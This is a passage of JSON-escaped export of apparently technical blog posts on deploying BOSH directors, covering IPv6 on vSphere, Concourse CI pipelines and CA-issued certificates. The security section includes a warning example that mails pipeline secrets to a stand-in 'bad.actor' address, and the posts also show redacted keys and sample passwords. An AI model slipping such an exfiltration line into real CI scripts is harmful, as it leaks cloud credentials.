addresses properly:\nbosh -e ipv4 -d nginx instances Using environment \u0026#39;bosh-vsphere-ipv4.nono.io\u0026#39; as user \u0026#39;admin\u0026#39; (openid, bosh.admin) ... Instance Process State AZ IPs nginx/821894df-9441-4325-92aa-2f4ded0e2bd9 running z1 10.0.9.165 2601:0646:0100:69f1:0000:0000:0000:0165 Next we browse to our newly-deployed web server (note this must be done from a workstation with an IPv6 address), http://[2601:646:100:69f1::165]/ or http://nginx-ipv6.nono.io/\n7. Conclusion We have seen how, using a standard BOSH director with a standard stemcell, we were able to deploy an IPv6-enabled VM running a service (nginx) that was reachable from the internet.\nGotchas Don\u0026rsquo;t abbreviate IPv6 addresses in BOSH manifests or Cloud Configs.\nDon\u0026rsquo;t use large reserved IP ranges (\u0026gt; 1k IP addresses); they will cause bosh deploy to hang.\nMake sure your application binds to the IPv6 address of your VM if you plan on using the IPv6 endpoint (e.g. http://[2601:646\\💯69f1::165]/). You may need to make additional configuration changes, possibly code changes.\nTech notes: the underlying system call (kernel interface) to create a socket, socket(2), requires the specification of the address family, which can either be IPv4 (AF_INET) or IPv6 (AF_INET6), which means that applications need to \u0026ldquo;opt-in\u0026rdquo; to binding to the IPv6 address (it\u0026rsquo;s not automatic). Certain applications are coded to bind to both IPv4 and IPv6 addresses seamlessly (e.g. sshd); however, that\u0026rsquo;s not the case for the majority of applications. Even nginx, a popular webserver, requires a fairly cryptic directive to bind to both IPv4 \u0026amp; IPv6: listen [::]:80 ipv6only=off; (the directive to listen to IPv4 is a simple listen 80;).\nBe aware of the security implications of IPv6 Router Advertisements BOSH stemcells are currently configured to accept IPv6 router advertisements which expose the VM to man-in-the-middle attacks. [Router Advertisements]\nIPv6 is enabled on all the VM\u0026rsquo;s interfaces. Once BOSH assigns an IPv6 address to an interface on a VM, the other interfaces may pick up an IPv6 address as well, one that was not assigned by BOSH but rather acquired via IPv6\u0026rsquo;s Neighbor Discovery Protocol\u0026rsquo;s (ND\u0026rsquo;s) stateless address autoconfiguration (SLAAC). For example, the web server we deployed acquired an additional IPv6 addresses on its \u0026ldquo;IPv4\u0026rdquo; interface: 2601:646:100:69f0:250:56ff:fe8c:86a9.\nCurrently BOSH doesn\u0026rsquo;t have a concept of \u0026ldquo;dual-stack\u0026rdquo;. In other words, when it deploys a VM, BOSH assigns the VM\u0026rsquo;s network interface either an IPv4 or an IPv6 address, but not both (though an IPv4 interface may acquire an IPv6 address via SLAAC).\nCurrently BOSH requires the IPv6 default route to reside in the same subnet as the gateway (often the IPv6 default route is an fe80::... address).\nBOSH won\u0026rsquo;t allocate certain addresses, e.g. \u0026ldquo;subnet zero\u0026rdquo;.\nHistory We began work in January 2017. Each week we picked one day to work in the late evening for three hours. The changes spanned several BOSH components: the BOSH Director (e.g commit 4a35c4b8), the BOSH agent (e.g. commit 0962dce7), the BOSH CLI (e.g. commit 0316b3a5), and BOSH deployment (e.g. commit 214ebac4).\nAcknowledgements We\u0026rsquo;d like to thank the many people who made IPv6-on-BOSH possible: the BOSH Development Team (Danny Berger, Chris De Oliveira, Tom Viehman, Eve Quintana, Difan Zhao, Joshua Aresty) for merging the pull requests and fleshing-out the testing structure, Toolsmiths (Mark Stokan, Ken Lakin, and Der Wei Chan) for creating the necessary environments, and IOPS (Sachin Prasad, Quintin Donnelly, and Pablo Lopez) for enabling IPv6.\nFootnotes [Ubuntu] IPv6 only works on Ubuntu Trusty stemcells; we haven\u0026rsquo;t yet made changes to the bosh-agent to accommodate IPv6 on the CentOS-flavored or Ubuntu Xenial stemcells. Pull requests are welcome.\n[why not dual stack?] Our deployed webserver VM is multihomed — it has two network interfaces: one which has the IPv4 address (10.0.9.165), and the other which has the IPv6 address (2601:646\\💯69f1::165). But a more common approach is to use a single, dual stack, network interface:\nA dual-stack device is a device with network interfaces that can originate and understand both IPv4 and IPv6 packets.\nSo why did we opt for the dual-homed single-stack approach instead of the single-homed, dual stack approach? The answer is that BOSH\u0026rsquo;s networking model assumes one and only one IP address (be it IPv4 or IPv6) is assigned to a given network interface. To accommodate dual stack we would have had to make changes to BOSH vSphere CPI and BOSH Agent - changes that would have required time we did not have. The multihomed single-stack approach was an expedient and technically valid choice.\n[Routing] Most non-BOSH-deployed machines with both IPv4 and IPv6 addresses have two default routes: one for IPv4, and one for IPv6 (we discount the link-local addresses (i.e. fe80::/10) which, by definition, don\u0026rsquo;t have a route). The BOSH networking model, as it currently stands, only allows one default route.\nThis restriction constrains the placement of the deployed VM: if the IPv6 interface has the default route, then the IPv4 doesn\u0026rsquo;t, which means that the VM must be deployed on the same subnet as the BOSH Director in order to communicate with it (the BOSH Director only communicates via IPv4, although we are actively working to change that).\nOn the other hand, if the IPv4 interface of the deployed VM has the default route, then the IPv6 interface doesn\u0026rsquo;t, which limits the usefulness of having a VM with an IPv6 address (the impetus to use IPv6 is driven by IPv4 address exhaustion, specifically routable addresses, and an IPv6 interface with no IPv6 route is not routable, and offers little value over an IPv4 address).\nHowever, all is not lost: the IPv6 interface of the deployed VM may acquire an IPv6 route via router advertisements. [Router Advertisements] That means it\u0026rsquo;s possible to deploy a VM with both IPv4 and IPv6 default routes.\n[why no abbreviations?] The BOSH Director codebase represents IPv6 addresses (in most cases, such as the internal database) as strings, and many manipulations will fail if abbreviated IPv6 addresses were used (e.g. \u0026ldquo;does this IPv6 address fall in this range?\u0026rdquo;).\nAlthough we\u0026rsquo;d like to have the capability to use abbreviated IPv6 addresses, and that may be a direction we take longer term, in the short term we must use fully-expanded IPv6 addresses. They are but a minor inconvenience to manifest writers.\n[Router Advertisements] IPv6\u0026rsquo;s Neighbor Discovery Protocol\u0026rsquo;s (ND\u0026rsquo;s) Router Advertisements allow for the discovery of IPv6 routes within an IPv6 subnet. Unfortunately, they may also be used to enable man-in-the-middle attacks (Infoblox has a blog post describing the security issues).\nThe BOSH agent enables the acceptance of router advertisements when an IPv6 is assigned to the VM (bosh-agent source code: sysctl settings and /etc/network/interfaces settings), which undoes the default settings of the stemcell (which disable router advertisements).\nWe plan to disable the acceptance of IPv6\u0026rsquo;s ND\u0026rsquo;s router advertisements and to replace it with another mechanism to allow both the IPv4 and IPv6 to have default routes (one idea we have been considering is a new property, ipv6_gateway).\nSimilarly, we plan to disable ICMPv6 Redirects on IPv6-enabled VMs in the future.\nUse caution when connecting to a VM that has acquired an IPv6 address on its IPv4 interface via SLAAC: having an IPv6 address on both interfaces of the deployed VM may cause odd networking behavior. For example, when using bosh ssh to connect to the IPv6 interface (i.e. the VM\u0026rsquo;s \u0026ldquo;far\u0026rdquo; interface) of the web server VM from a workstation on the same subnet (same VLAN) as the VM\u0026rsquo;s IPv4 interface, and if the VM has acquired an IPv6 address on its IPv4 interface (i.e. the VM\u0026rsquo;s \u0026ldquo;near\u0026rdquo; interface), then the bosh ssh sessions will disconnect (TCP RESET) within 60 seconds. A workaround would be to ssh to the IPv4 interface or the \u0026ldquo;near\u0026rdquo; IPv6 interface.\nCorrections \u0026amp; Updates 2018-01-27\nTrimmed Gotchas section; moved excessive detail into Footnotes section\nCreated an Acknowledgements section\n2018-01-28\nNeighbor Discovery Protocol is abbreviated \u0026ldquo;ND\u0026rdquo;, not \u0026ldquo;NP\u0026rdquo;\n","permalink":"https://blog.nono.io/post/bosh-on-ipv6-2/","summary":"0. Abstract BOSH is a VM orchestrator; a BOSH Director creates, configures, monitors, and deletes VMs. The BOSH Director interoperates with a number of IaaSes (Infrastructure as a Service), one of which is VMware vSphere, a virtualization platform. BOSH traditionally operates exclusively within the IPv4 networking space (i.e. the BOSH Director has an IPv4 address (e.g. 10.0.0.6), and the VMs which it deploys also have IPv4 addresses); however, recent changes have enabled IPv6 networking within the BOSH Framework.","title":"Deploying BOSH VMs with IPv6 Addresses on vSphere"},{"content":"\u0026ldquo;BOSH deploys Concourse, and Concourse deploys BOSH\u0026rdquo; —Cloud Foundry koan\nA BOSH Director is a VM (virtual machine) orchestrator which is itself a VM. BOSH solves the problem of keeping its VMs\u0026rsquo; applications (operating systems (stemcells) and releases) up-to-date with the command, bosh deploy; however, this begs the question, \u0026ldquo;what keeps the BOSH Director itself up-to-date?\u0026rdquo;. [Quis custodiet?]\nWe explore using Concourse, a Continuous Integration (CI) server, and bosh-deployment [Updating BOSH], in order to create a Concourse pipeline which updates, in turn, a BOSH director on AWS (Amazon Web Services), on Microsoft Azure, and GCP (Google Cloud Platform). Updating all three BOSH directors can be accomplished with a single click. [One click] Best of all, our directors are re-deployed with a recent stemcell, BOSH release, and CPI release. [How recent?]\n0. Overview Our Concourse pipeline is publicly-viewable, and can be seen at https://ci.nono.io/teams/main/pipelines/BOSH. It\u0026rsquo;s a straightforward pipeline which consists of three jobs, one for each director on each IaaS (Infrastructure as a Service): bosh-aws.nono.io, bosh-azure.nono.io, and bosh-gce.nono.io.\nBelow is a diagram of our Concourse configuration which describes the pipeline in greater detail. Note that we keep our credentials (e.g our AWS access key and secret) in LastPass (see items in red), but LastPass is not strictly necessary: credentials can be embedded directly in the BOSH manifests, can be passed as variables during the BOSH manifest creation, or can be maintained as files on the local hard drive.\n1. Concourse Tasks To build our Concourse pipeline, we begin with the the smallest configurable component, the Concourse task.\nThe Concourse task is often a set of Concourse resources (e.g GitHub repositories containing BOSH manifests), environment variables (e.g. ${IAAS} (the IaaS to which we\u0026rsquo;re deploying)), and perhaps most importantly, the shell script which deploys the director.\n1.0 Concourse Task Shell Script Here is our annotated shell script our Concourse tasks use to deploy our BOSH director:\n[Note: see next section, Simplify the Concourse Task, for a simpler task shell script; it\u0026rsquo;s a better starting point. We customize our BOSH directors in a manner which complicates our task shell script.]\n#!/bin/bash # We abort the script as soon as we hit an error (as soon as a command exits # with a non-zero exit status) set -e # `cunnie-deployments` is the checked-out GitHub repo that contains our BOSH # manifests and our directors\u0026#39; `-state.json` files; it also contains this # script (task script) and task definition. pushd cunnie-deployments # We invoke the script that generates our BOSH director\u0026#39;s manifest, e.g. # `aws.sh`, `azure.sh`. The output, the BOSH director\u0026#39;s manifest, is named # `bosh-$IAAS.yml`, e.g. `bosh-aws.yml` bin/$IAAS.sh # Does ${DEPLOYMENTS_YML} have a complete set of interpolated variables? # Abort if not (`--var-errs`). bosh int bosh-$IAAS.yml \\ --var-errs \\ -l \u0026lt;(echo \u0026#34;$DEPLOYMENTS_YML\u0026#34;) \\ -l \u0026lt;(curl https://raw.githubusercontent.com/cunnie/sslip.io/master/conf/sslip.io%2Bnono.io.yml) \\ \u0026gt; /dev/null # We attempt to deploy our BOSH director. We prepare a git commit message # regardless whether our attempt succeeds or fails because we need to retain any # change to the BOSH director\u0026#39;s `-state.json` file. This is necessary in cases # where a deploy proceeds far enough to create a broken director VM, for # subsequent deploys must be able to destroy the broken director VM in order to # free up its IP address so that the current deploy will succeed. The crucial # information needed to destroy the broken director VM is its VM\u0026#39;s ID, which is # recorded in the `-state.json` file. # Note that `set -e` does not trigger an abort if the command that returns a # non-zero exit code is the subject of an `if` block, i.e. `if bosh create-env`; # this gives us the breathing room to commit our results regardless of whether # `bosh create-env` succeeded or failed if bosh create-env bosh-$IAAS.yml \\ -l \u0026lt;(echo \u0026#34;$DEPLOYMENTS_YML\u0026#34;) \\ -l \u0026lt;(curl https://raw.githubusercontent.com/cunnie/sslip.io/master/conf/sslip.io%2Bnono.io.yml); then GIT_COMMIT_MESSAGE=\u0026#34;CI PASS: $IAAS BOSH deploy ✈️\u0026#34; DEPLOY_EXIT_STATUS=0 else GIT_COMMIT_MESSAGE=\u0026#34;CI FAIL: $IAAS BOSH deploy ✈️\u0026#34; DEPLOY_EXIT_STATUS=1 fi # Do we need to commit anything? If a new director hasn\u0026#39;t been deployed (most # often because there\u0026#39;s been no change to the manifest, releases, or stemcell), # then we don\u0026#39;t need to commit if ! git diff --quiet HEAD --; then # If we\u0026#39;re in this block, then there has been a deployment. Let\u0026#39;s set our # git author to avoid git\u0026#39;s `*** Please tell me who you are.` error. git config --global user.name \u0026#34;Concourse CI\u0026#34; git config --global user.email brian.cunnie@gmail.com # We check out our branch\u0026#39;s HEAD because Concourse\u0026#39;s git-resource leaves us # in `detached HEAD` state. ${DEPLOYMENTS_BRANCH} is typically set to # `master`, but may be set to something else (usually while testing). git checkout $DEPLOYMENTS_BRANCH git add . git commit -m\u0026#34;$GIT_COMMIT_MESSAGE\u0026#34; fi popd # We copy our repo with its new commit to a new directory. The Concourse job, # after it finishes running this task, will push the new commit to GitHub. # Note that `cp -R` works as well as `rsync`; we use `rsync` by force of # habit. rsync -aH cunnie-deployments/ cunnie-deployments-with-state/ # We exit with the return code of `bosh create-env`; if the deploy failed, then # this Concourse task failed exit $DEPLOY_EXIT_STATUS For those interested in the scripts which generate the BOSH director manifests (e.g. aws.sh), they were covered in an earlier blog post. For links to the scripts and the manifests they generate, see the table below:\nIaaS Script Generated Manifest AWS aws.sh bosh-aws.yml Azure azure.sh bosh-azure.yml GCP gce.sh bosh-gce.yml 1.1 Simplify the Concourse Task Script Simplify the Concourse task script. Specifically, inline the bosh-${IAAS}.sh script, then collapse the two bosh interpolate commands into the singular bosh create-env command.\nStart with a simple Concourse task script. Really. Don\u0026rsquo;t use the task script we use, [Why so complicated?] , the one listed above. Instead, start with a simplified task script, like bosh-simple.sh. We have tested it; it successfully deploys a director.\n1.2 Concourse Task Configuration file Now that we have our task\u0026rsquo;s shell script, we turn our attention to our task\u0026rsquo;s (YAML) configuration file. It can be viewed on GitHub, and is displayed below, too:\n--- platform: linux image_resource: type: docker-image source: repository: cunnie/fedora-golang-bosh inputs: - name: cunnie-deployments - name: bosh-deployment outputs: - name: cunnie-deployments-with-state params: # vainly default branch to master, but it\u0026#39;s always overridden from the pipeline DEPLOYMENTS_BRANCH: \u0026#39;master\u0026#39; DEPLOYMENTS_YML: \u0026#39;\u0026#39; IAAS: \u0026#39;\u0026#39; run: path: cunnie-deployments/ci/tasks/bosh.sh Notes:\nimage_resource: We use a custom-built Docker image, cunnie/fedora-golang-bosh (https://hub.docker.com/r/cunnie/fedora-golang-bosh/~/dockerfile/); but you may choose to use your own Docker image; just be sure that the BOSH CLI is installed. Our image is fairly hefty (450 MB), for it has a rich set of tools available to us when we need to intercept the container to troubleshoot a build.\ninputs: We have two inputs: bosh-deployment, a git repo which contains the manifests and tools necessary to deploy a BOSH director (this is the canonical way to deploy a BOSH director), and cunnie-deployments, a git repo which contains our BOSH directors\u0026rsquo; manifests and state files. Also, this repo contains the required Concourse task definition (ci/tasks/bosh.yml) and script (ci/tasks/bosh.sh).\noutputs: We have one output, cunnie-deployments-with-state, which is the same as the input, cunnie-deployments. Concourse prohibits an input from also being an output, so our script copies the contents of one to the other. cunnie-deployments-with-state includes the commits made by the task (in the case of a deploy, the state file and possibly the BOSH director\u0026rsquo;s manifest). This output is used by a subsequent step in the Concourse job which will push any git commits to GitHub (although this Concourse task may make git commits, it won\u0026rsquo;t push them — it leaves that responsibility to the Concourse job).\nparams: DEPLOYMENTS_BRANCH is almost always set to master; it refers to the branch in the cunnie-deployments repo. IAAS is either aws, azure, or gce. DEPLOYMENTS_YML is YAML-formatted and contains secrets needed to deploy; sample contents can be viewed in an earlier blog post.\n[Note: you may opt to bypass the task configuration file completely and embed the necessary information into pipeline.yml; here is an example of embedding the task configuration directly into the pipeline.]\n2. Concourse Jobs The Concourse job is straightforward:\nIt checks out the cunnie-deployments and bosh-deployment git repos It runs the task which deploys the BOSH director to the specified IaaS It pushes changes to the director manifest (bosh-${IAAS}.yml) and the director state (bosh-${IAAS}-state.json) to the cunnie-deployments repo regardless of whether the deploy succeeded or failed (i.e. the ensure directive) Here is the Concourse job definition which deploys the BOSH director to the AWS IaaS:\njobs: - name: bosh-aws.nono.io plan: - get: cunnie-deployments - get: bosh-deployment - task: deploy file: cunnie-deployments/ci/tasks/bosh.yml params: DEPLOYMENTS_BRANCH: master DEPLOYMENTS_YML: ((deployments_yml)) IAAS: aws ensure: put: cunnie-deployments params: repository: cunnie-deployments-with-state/ 3. Concourse Pipeline The full Concourse pipeline (pipeline.yml) can be seen here. Below is an abbreviated portion which shows the Concourse resources and the first job (which deploys the AWS BOSH director):\n# fly -t nono sp -p BOSH -c ~/workspace/deployments/ci/pipeline.yml -v github_deployments_key=\u0026#34;$(lpass show --note github_deployments_key)\u0026#34; -v deployments_yml=\u0026#34;$(lpass show --note deployments.yml)\u0026#34; jobs: - name: bosh-aws.nono.io plan: - get: cunnie-deployments - get: bosh-deployment - task: deploy file: cunnie-deployments/ci/tasks/bosh.yml params: DEPLOYMENTS_BRANCH: master DEPLOYMENTS_YML: ((deployments_yml)) IAAS: aws ensure: put: cunnie-deployments params: repository: cunnie-deployments-with-state/ # Other jobs redacted for brevity resources: - name: cunnie-deployments type: git source: uri: git@github.com:cunnie/deployments.git private_key: ((github_deployments_key)) branch: master - name: bosh-deployment type: git source: uri: https://github.com/cloudfoundry/bosh-deployment.git Notes:\nThe first line is a convenience comment; it shows the fly (Concourse CLI) command which updates the Concourse server\u0026rsquo;s pipeline after changes have been made to the pipeline.yml file. We cut-and-paste that comment into our shell whenever we make a change to pipeline.yml in order to propagate the changes to the pipeline to our Concourse server:\nfly -t nono sp -p BOSH -c ~/workspace/deployments/ci/pipeline.yml -v github_deployments_key=\u0026#34;$(lpass show --note github_deployments_key)\u0026#34; -v deployments_yml=\u0026#34;$(lpass show --note deployments.yml)\u0026#34; We have already discussed deployments_yml (i.e. the Concourse task environment variable/parameter DEPLOYMENTS_YML), but the other variable, github_deployments_key, warrants discussion. It is a GitHub deploy key which allows our job to push changes to the cunnie-deployments repo [Interpolation] .\nWe\u0026rsquo;d like to discuss how we stop the pipeline when the deploy of a BOSH director fails. We use Concourse\u0026rsquo;s passed directive. For example, if our deploy of the AWS director fails, we do not want to deploy the Azure director.\nThe following shows the diff between the job to deploy the AWS director and the job to deploy Azure director. Pay special attention to the passed and trigger directives: the deploy of the Azure director is kicked off if and only if there has been a successful deploy of the AWS director. This limits the damage caused by a flawed configuration: only one director is knocked offline (typically the first one, AWS), not all three.\n-- name: bosh-aws.nono.io +- name: bosh-azure.nono.io plan: - get: cunnie-deployments + passed: [ bosh-aws.nono.io ] + trigger: true - get: bosh-deployment + passed: [ bosh-aws.nono.io ] + trigger: true - task: deploy file: cunnie-deployments/ci/tasks/bosh.yml params: DEPLOYMENTS_BRANCH: master DEPLOYMENTS_YML: ((deployments_yml)) - IAAS: aws + IAAS: azure ensure: put: cunnie-deployments params: 4. Security Restrict your Concourse teams to people you trust, don\u0026rsquo;t unnecessarily expose your pipelines or publish your pipelines\u0026rsquo; configurations (.yml files). Similarly, restrict access to your GitHub repo which has your director manifests and Concourse scripts.\nOur credentials are stored in our Concourse pipeline, and they can be easily revealed by a trusted user with the following command:\nfly -t nono get-pipeline -p BOSH These credentials include IaaS credentials, which will allow a bad actor to spin up multiple VMs to run, say, Bitcoin mining. A co-worker of the author whose credentials were compromised had unauthorized AWS charges exceeding $3k.\nIt is also important to restrict access to the GitHub repo which contains the scripts that are run. Although the repo does not contain credentials, it enables the execution of commands which can reveal the credentials. For example, the following line of code could be added to the ci/tasks/bosh.sh script to email the credentials to the bad actor:\necho ${DEPLOYMENTS_YML} | mail -s \u0026#34;secret credentials\u0026#34; bad.actor@mailinator.com Footnotes [Quis custodiet?] \u0026ldquo;Who updates the VM [BOSH director] that keeps the other VMs updated?\u0026rdquo; is the question, versions of which have been asked as long ago as the days of the Roman poet Juvenal, who famously asked, \u0026ldquo;Quis custodiet ipsos custodes?\u0026rdquo; and as recently as this century by comic book writer Alan Moore, who phrased it, \u0026ldquo;Who watches the Watchmen?\u0026rdquo;\n[How recent?] How fresh is bosh-deployment? Fresh. bosh-deployment is a quite active git repo, typically updated several times or more each week. It\u0026rsquo;s the tool that the BOSH team, and many Cloud Foundry teams, use to keep their BOSH directors current.\n[Updating BOSH] In the early days, the BOSH micro plugin was the mechanism to update the BOSH director. There were several drawbacks to the micro plugin, one of which is that it forced the BOSH CLI to have an understanding of the API for various IaaSes, breaking the Cloud Layer abstraction model.\nAnother drawback of the BOSH micro plugin was that it was brittle, so much so that it was a common pattern to deploy a BOSH director whose sole purpose was to deploy the \u0026ldquo;real\u0026rdquo; BOSH director. \u0026ldquo;Ha!\u0026rdquo; one might ask, \u0026ldquo;But how did you keep that first BOSH director up-to-date?\u0026rdquo; The answer is simple: you didn\u0026rsquo;t. You left that first BOSH director running and never touched it except to redeploy the \u0026ldquo;real\u0026rdquo; BOSH director. You might spin it down if you weren\u0026rsquo;t using it, but you never deleted it or updated it.\nThese were serious problems, and to address them the BOSH Core team wrote bosh-init, a Golang-based executable whose purpose was to deploy BOSH directors. It adhered to the Cloud Layer abstraction models (it used the existing CPIs (Cloud Provider Interfaces) for the existing IaaSes (VMware vSphere, Google Cloud Platform (GCP), OpenStack, Microsoft Azure, among others)).\nBy April 30, 2015, bosh-init was production-ready, and the BOSH documentation was updated to reflect the new world order.\nBut all was not perfect in the Garden of Eden, for the introduction of bosh-init split the CLIs: whereas before there was one BOSH CLI, now there were two: bosh, the original Ruby-based CLI for managing a BOSH director\u0026rsquo;s deployment, and bosh-init for deploying a BOSH director itself. In many ways this resembled the Western Schism, a dark chapter in the Roman Catholic church when there were two popes (who had the terrible habit of excommunicating each other). The BOSH development team remedied this situation by creating a third CLI, the Golang-based CLI. In this regard, the BOSH development team\u0026rsquo;s approach mirrored the approach attempted by the Catholic cardinals, who elected a third pope. The BOSH team\u0026rsquo;s approach succeeded, but the cardinals\u0026rsquo; didn\u0026rsquo;t (they were left with three popes running around excommunicating each other).\n[One click] It\u0026rsquo;s technically possible to kick off the builds with zero clicks — to kick off the build automatically if, say, a commit is pushed to the bosh-deployment repository. The modification to the pipeline is trivial:\n- name: bosh-aws.nono.io plan: - get: cunnie-deployments - get: bosh-deployment + trigger: true - task: deploy However, the decision to trigger automatically is not without risks: the BOSH director may be in the middle of a delicate task, such as updating a deployment, and won\u0026rsquo;t have the opportunity to gracefully bring itself down, forbosh create-env is relentless, brooks no delays, and gives no quarter.\nOn a more technical note, bosh create-env, although it will attempt to contact the BOSH agent on the original BOSH director in order to terminate the jobs and shut down the VM, it does not run the drain scripts (scripts which allow the BOSH jobs to clean up and get into a state where they can be safely stopped).\nThere is discussion within the BOSH development team whether to modify the behavior of bosh create-env to make it run the drain scripts. On the positive side, it will allow a more cavalier approach to re-deploying the director, and make the behavior of bosh create-env more closely approximate the behavior of a BOSH director. On the downside, the time to deploy a BOSH director may vary widely, dependent on the time it takes for the drain scripts to complete.\n[Interpolation] Our GitHub deploy key resembles the following (not our real key) [Elliptic-curve] :\n-----BEGIN EC PRIVATE KEY----- MHcCAQEEIMxcR2wlxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxqY/VyDTL AwEHoUQDQgAEmBUxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxjY98wOPVZ Ayz++1vHXODWeiC/CjNu7hOVaB682ZZfCw== -----END EC PRIVATE KEY----- Concourse, when passed the flag ... -v github_deployments_key=\u0026quot;$(lpass show --note github_deployments_key)\u0026quot; will interpolate this section of pipeline.yml:\ntype: git source: uri: git@github.com:cunnie/deployments.git private_key: ((github_deployments_key)) After interpolation, the pipeline looks like this:\n- name: cunnie-deployments type: git source: uri: git@github.com:cunnie/deployments.git # previously: private_key: ((github_deployments_key)) private_key: | -----BEGIN EC PRIVATE KEY----- MHcCAQEEIMxcR2wlxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxqY/VyDTL AwEHoUQDQgAEmBUxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxjY98wOPVZ Ayz++1vHXODWeiC/CjNu7hOVaB682ZZfCw== -----END EC PRIVATE KEY----- If your pipeline is not public, it may be easier to skip variable interpolation and embed the credential(s) directly.\n[Why so complicated?] Our Concourse task is complicated (i.e. bosh.sh calls bosh-${IAAS}.sh, calls bosh CLI three times) because we have requirements beyond merely deploying a BOSH director:\nWe retain intermediate BOSH manifests (e.g. bosh-aws.yml, manifests that are completely populated with the exception of the secrets (passwords, credentials, private keys). The sole purpose of the first bosh interpolate commands is to generate the intermediate manifest. We realize that our love of the intermediate manifests is not wholly rational: time was when a working BOSH manifest was a precious thing, something to tend to and to preserve. With the advent of bosh-deployment, which reliably generates BOSH manifests, the intermediate manifests have diminished in importance, and are now merely artifacts of a bygone age. And yet we still cling to them, for they provide a sense of comfort, like a mother\u0026rsquo;s hot apple pie.\nWe prefer to set our own passwords rather than use the ones auto-generated [auto-passwords] by the BOSH CLI. This has two implications:\nIt forces us to set the password variables in a counter-intuitive manner (e.g. bosh interpolate ... -v admin_password='((admin_password))' ...) (which says, in effect, \u0026ldquo;replace all occurrences of \u0026lsquo;((admin_password))\u0026rsquo; with \u0026lsquo;((admin_password))\u0026rsquo;.\u0026rdquo;), which prevents the BOSH CLI from using its auto-generated passwords and paves the way to subsequently interpolate our passwords. This adds several lines to our scripts.\nIt forces us to check to make sure that we haven\u0026rsquo;t overlooked any variables (i.e. we run bosh interpolate --var-errs ...), so that, for example, our director\u0026rsquo;s password is set to IReturnedAndSawUnderTheSun and not ((admin_password))). This adds several more lines to our scripts.\nOur BOSH director uses certificates issued by a recognized CA (Certificate Authority) (in our case, Comodo). This requires us to create a manifest operations file (e.g. etc/aws.yml) which we pass to bosh interpolate which overrides the auto-generated SSL certificate \u0026amp; key with our certificate \u0026amp; key.\nSome of our BOSH directors (e.g. bosh-aws.nono.io) are more than mere BOSH directors — they are also nginx servers (web servers), DNS (Domain Name System) servers, and NTP (Network Time Protocol) servers. This adds three more lines to our scripts.\nNote: one advantage of using CA-issued certificates and easy-to-remember passwords is that it enables one to reach the BOSH director via the CLI without needing the creds.yml file — one can sit at a new workstation, type bosh -e bosh-gce.nono.io login, and proceed to manage deployments, releases, stemcells, etc\u0026hellip;.\n[auto-passwords] The BOSH CLI generates high-entropy passwords when --vars-store flag is passed.\nHere is a list of sample passwords that bosh create-env --vars-store=... creates:\nadmin_password: qn7hc6zsq0nphhsvojx3 blobstore_agent_password: iut5wdyeo5kkhvqoerj0 blobstore_director_password: wm0qgnzdwgy8k1hnm4nq hm_password: plk829eob45khq6o9dl5 mbus_bootstrap_password: nf16h5e9j120uqp35hlr nats_password: gr4s0xmj4s5iccqv69dt postgres_password: 7nxuq714hxcta513778g registry_password: ffxnhu4xtgh7lsxu7xpl Note that the passwords are 20 bytes long and consist of random sequence of numbers and lowercase letters. Each byte can be one of 36 possibilites (10 numbers plus 26 letters). Given that there are 20 bytes, the total number of combinations is 3620, 1.33 x 1031, effectively rendering the password immune to a brute-force attack (even if you could make a million attempts every second, it would still require 4 × 1017 years to exhaust all combinations. In other words, you\u0026rsquo;d crack the password long after the Stelliferous Era ended and you were well into the Degenerate Era).\n[Elliptic-curve]We use elliptic-curve cryptography (ECC) keys, for they are much shorter than an RSA key of equivalent strength, and thus more manageable. Unfortunately, they are not universally accepted (e.g. AWS will respond with \u0026ldquo;Error importing Key Pair Key is not in valid OpenSSH public key format\u0026rdquo; when importing an EC public key).\nWhere elliptic-curve cryptography is concerned, GitHub is ahead of the proverbial curve, and AWS, behind.\nCorrections \u0026amp; Updates 2017-12-01\nWe suggest simplifying the Concourse task script. The Concourse task script executes the BOSH CLI three times (bosh int twice and bosh create-env once), but need only execute it once (bosh create-env) when intermediate artifacts aren\u0026rsquo;t desired.\n2017-11-25\nDavid McClure pointed out that the OpenStack link was missing; it has been added. Thanks, David.\n","permalink":"https://blog.nono.io/post/bosh-deployed-with-concourse/","summary":"\u0026ldquo;BOSH deploys Concourse, and Concourse deploys BOSH\u0026rdquo; —Cloud Foundry koan\nA BOSH Director is a VM (virtual machine) orchestrator which is itself a VM. BOSH solves the problem of keeping its VMs\u0026rsquo; applications (operating systems (stemcells) and releases) up-to-date with the command, bosh deploy; however, this begs the question, \u0026ldquo;what keeps the BOSH Director itself up-to-date?\u0026rdquo;. [Quis custodiet?]\nWe explore using Concourse, a Continuous Integration (CI) server, and bosh-deployment [Updating BOSH], in order to create a Concourse pipeline which updates, in turn, a BOSH director on AWS (Amazon Web Services), on Microsoft Azure, and GCP (Google Cloud Platform).","title":"Maintaining BOSH Directors with Concourse CI and bosh-deployment"},{"content":"0. Abstract A BOSH director is a virtual machine (VM) orchestrator which deploys VMs to various Infrastructures as a Service (IaaS) such as Amazon Web Services (AWS) and Google Cloud Platform (GCP). The BOSH Command Line (CLI) communicates with the director over Secure Sockets Layer (SSL). While most BOSH directors are deployed with self-signed certificates, it is possible to configure a BOSH director with certificates issued by a recognized certificate authority (CA) (e.g. Comodo, Symantec, Let\u0026rsquo;s Encrypt). This blog post describes a technique to deploy a BOSH director with a CA-issued SSL certificate.\nAdditionally, this blog posts describes a mechanism to override the automatically-generated passwords (e.g. for logging into the director from the CLI).\nThis blog post may be of use to organizations who desire the following:\nuse CA-issued SSL certificates on their BOSH director set specific passwords on the BOSH director\u0026rsquo;s services (e.g. login, PostgreSQL) dispense with the --var-store file (which stores the auto-generated passwords and the self-signed SSL certificate authority\u0026rsquo;s certificate), a file created by the BOSH CLI during deployment and which normally must be stored in a safe \u0026amp; secure manner This blog posts assumes familiarity with BOSH CLI v2 and with the procedure to deploy a BOSH director.\nThe blog post describes deploying (i.e. creating) a BOSH director (bosh-gce.nono.io) to the Google Cloud Platform.\nThe BOSH Development Team has put much engineering into the CA/certificate generation \u0026amp; workflow and also in generating secure (i.e. high entropy) passwords. By following the instructions in this blog post, you\u0026rsquo;re deliberately tossing that work aside, and may open your BOSH director to subtle (or perhaps not-so-subtle) attacks. At the very least you void your warranty.\nYou have been warned.\n1. Overview of the Procedure To Deploy a BOSH Director The procedure to deploy a BOSH director with valid SSL certificate is a superset of the normal procedure to deploy a BOSH director, with an additional step: using bosh interpolate to create 